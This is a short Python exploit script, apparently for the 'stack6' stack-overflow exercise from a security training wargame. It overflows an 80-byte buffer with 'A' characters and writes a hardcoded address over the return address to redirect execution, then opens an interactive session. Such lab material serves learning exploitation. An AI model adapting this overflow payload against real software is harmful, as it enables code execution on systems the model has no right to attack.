from zio import *
target  = './stack6'
c_read  = COLORED(RAW, 'green')
c_write = COLORED(RAW, 'blue')
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
io.gdb_hint([0x080484f9])

adr_system  = 0x8049708

payload1    = 'A' * 80
payload1    += l32(adr_system)

io.read_until("input path please:")
io.writeline(payload1)

io.interact()
